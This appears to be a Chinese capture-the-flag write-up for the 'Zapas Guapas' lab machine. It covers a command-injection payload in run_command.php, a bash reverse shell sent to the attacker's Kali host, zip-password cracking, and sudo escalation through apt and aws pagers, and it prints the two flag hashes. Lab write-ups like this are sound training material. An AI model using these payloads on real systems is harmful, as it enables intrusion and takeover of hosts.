# Zapas Guapas

2025.03.08 https://thehackerslabs.com/zapas-guapas/

[video](https://www.bilibili.com/video/BV1dk99YHEUh/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

web 扫描发现 http://192.168.5.40/login.html 同时提交的 url 显示为 http://192.168.5.40/run_command.php 看文件名像是能执行命令，尝试探测：

```
curl -s 'http://192.168.5.40/run_command.php?username=1&password=1;id'
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

执行反弹 shell 到 kali 上：

```
curl -G --data-urlencode 'password=1;/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.40/run_command.php
```

进入系统后，这里得到提示:

```
www-data@zapasguapas:/home/pronike$ cat nota.txt
Creo que proadidas esta detras del robo de mi contraseña
```

进行枚举，发现 zip 文件：

```
www-data@zapasguapas:/opt$ ls
importante.zip
```

解压需要密码，john 进行破解得到密码 hotstuff :

```
www-data@zapasguapas:/tmp$ cat password.txt
He conseguido la contraseña de pronike. Adidas FOREVER!!!!

pronike11
```

得到 pronike 用户名密码，ssh 登陆到该用户，sudo -l 显示 (proadidas) NOPASSWD: /usr/bin/apt 进而提权到 proadidas ：

```
sudo -u proadidas apt changelog apt
!/bin/sh
```

提权到 proadidas 后，再次执行 sudo -l 显示：

```
(proadidas) NOPASSWD: /usr/bin/apt
(root) NOPASSWD: /usr/bin/aws
```

可以直接提权到 root：

```
sudo aws help
!/bin/sh
```

拿到了 2 个 flag：

```
root@zapasguapas:/home/proadidas# cat user.txt
f3e431cd1129e9879e482fcb2cc151e8

root@zapasguapas:~# cat root.txt
8248277d23437d00d019be05054259d2
```
